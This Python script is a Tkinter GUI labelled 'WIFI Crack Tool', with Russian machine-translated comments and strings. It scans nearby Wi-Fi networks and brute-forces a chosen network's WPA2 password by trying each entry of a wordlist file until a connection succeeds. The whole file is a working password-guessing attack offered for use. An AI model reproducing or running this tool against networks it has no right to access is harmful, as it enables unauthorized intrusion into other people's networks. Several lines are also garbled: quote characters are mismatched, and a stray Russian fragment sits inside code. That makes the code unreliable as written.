from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog # Открыть просмотр файлов в Gui
import tkinter.messagebox # Открыть окно напоминания о сообщении

class MY_GUI():
	def __init__(self,init_window_name):
		self.init_window_name = init_window_name

		# Путь к файлу пароля
		self.get_value = StringVar() # Установить переменное содержимое

		# Получить взломать Wi-Fi аккаунт
		self.get_wifi_value = StringVar()

		# Получить пароль Wi-Fi
		self.get_wifimm_value = StringVar()

		self.wifi = pywifi.PyWiFi()  # Захватить сетевой интерфейс
		self.iface = self.wifi.interfaces()[0] # Возьмите первую беспроводную карту
		self.iface.disconnect()  # Тестовая ссылка отключить все ссылки
		time.sleep(1)  # Спать в течение 1 секунды
		# Проверьте, отключена ли сетевая карта
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

	def __str__(self):
        # Автоматический вызов функции, возврат к собственной сетевой карте
		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())

	# Окно настроек
	def set_init_window(self):
		self.init_window_name.title("WIFI Crack Tool")
		self.init_window_name.geometry('+500+200')

		labelframe = LabelFrame(width=400, height=200,text=«Конфигурация»)  #Framework, следующие объекты добавлены для labelframe
		labelframe.grid(column=0, row=0, padx=10, pady=10)

		self.search = Button(labelframe,text="Поиск поблизости WiFi",command=self.scans_wifi_list).grid(column=0,row=0)

		self.pojie = Button(labelframe,text=«Начать взламывать»,command=self.readPassWord).grid(column=1,row=0)

		self.label = Label(labelframe,text="Путь к каталогу:").grid(column=0,row=1)

		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)

		self.file = Button(labelframe,text=«Добавить каталог файлов паролей»,command=self.add_mm_file).grid(column=2,row=1)

		self.wifi_text = Label(labelframe,text="WiFi аккаунт:").grid(column=0,row=2)

		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)

		self.wifi_mm_text = Label(labelframe,text=«Пароль WiFi:»).grid(column=2,row=2)

		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)

		self.wifi_labelframe = LabelFrame(text="Список Wi-Fi")
		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)


		# Определить древовидную структуру и полосу прокрутки
		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show="headings",columns=("a", "b", "c", "d"))
		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
		self.wifi_tree.configure(yscrollcommand=self.vbar.set)

		# Название таблицы
		self.wifi_tree.column("a", width=50, anchor="center")
		self.wifi_tree.column("b", width=100, anchor="center")
		self.wifi_tree.column("c", width=100, anchor="center")
		self.wifi_tree.column("d", width=100, anchor="center")

		self.wifi_tree.heading("a", text="WiFiID")
		self.wifi_tree.heading("b", text="SSID")
		self.wifi_tree.heading("c", text="BSSID")
		self.wifi_tree.heading("d", text="signal")

		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
		self.wifi_tree.bind("<Double-1>",self.onDBClick)
		self.vbar.grid(row=4,column=1,sticky=NS)

	# Поиск Wi-Fi
	#cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
	def scans_wifi_list(self):  # Сканирование окружающего списка Wi-Fi
		# Начать сканирование
		print("^ _ ^ Начать сканирование ближайшего Wi-Fi ...")
		self.iface.scan()
		time.sleep(15)
		# Получить результаты сканирования через несколько секунд
		scanres = self.iface.scan_results()
		# Подсчитайте количество точек доступа, найденных поблизости
		nums = len(scanres)
		print(«Количество:% s»%(nums))
		#print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
		# Фактические данные
		self.show_scans_wifi_list(scanres)
		return scanres

	# Показать список Wi-Fi
	def show_scans_wifi_list(self,scans_res):
		for index,wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
			self.wifi_tree.insert("",'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
			#print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

	# Добавить каталог файлов паролей
	def add_mm_file(self):
		self.filename = tkinter.filedialog.askopenfilename()
		self.get_value.set(self.filename)

	# Связывающие события дерева
	def onDBClick(self,event):
		self.sels= event.widget.selection()
		self.get_wifi_value.set(self.wifi_tree.item(self.sels,"values")[1])
		#print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

	# Прочитать словарь паролей, чтобы соответствовать
	def readPassWord(self):
		self.getFilePath = self.get_value.get()

		self.get_wifissid = self.get_wifi_value.get()

		pwdfilehander=open(self.getFilePath,"r",errors="ignore")
		while True:
				try:
					self.pwdStr=pwdfilehander.readline()

					if not self.pwdStr:
						break
					self.bool1=self.connect(self.pwdStr,self.get_wifissid)

					if self.bool1:
						self.res = "=== правильно === имя wifi:% s совпадает с паролем:% s"%(self.get_wifissid,self.pwdStr)
						self.get_wifimm_value.set(self.pwdStr)
						tkinter.messagebox.showinfo('Подсказка', «Успешная трещина! ! ! ')
						print(self.res)
						break
					else:
						self.res = "--- Ошибка --- имя wifi:% s соответствует паролю:% s"%(self.get_wifissid,self.pwdStr)
						print(self.res)
					sleep(3)
				except:
					continue
	# Сопоставить WiFi и пароль
	def connect(self,pwd_Str,wifi_ssid):
		# Создать файл ссылки wifi
		self.profile = pywifi.Profile()
		self.profile.ssid =wifi_ssid #wifiName
		self.profile.auth = const.AUTH_ALG_OPEN  # Открытие сетевой карты
		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)# алгоритм шифрования wifi
		self.profile.cipher = const.CIPHER_TYPE_CCMP    Блок шифрования
		self.profile.key = pwd_Str #пароль
		self.iface.remove_all_network_profiles() # Удалить все файлы Wi-Fi
		self.tmp_profile = self.iface.add_network_profile(self.profile)# Установить новый файл ссылки
		self.iface.connect(self.tmp_profile)#ссылка на сайт
		time.sleep(5)
		if self.iface.status() == const.IFACE_CONNECTED:  # Решить, подключаться ли
			isOK=True
		else:
			isOK=False
		self.iface.disconnect() #Отключить
		time.sleep(1)
		# Проверьте состояние отключения
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
		return isOK

def gui_start():
	init_window = Tk()
	ui = MY_GUI(init_window)
	print(ui)
	ui.set_init_window()
	#ui.scans_wifi_list()

	init_window.mainloop()

gui_start()
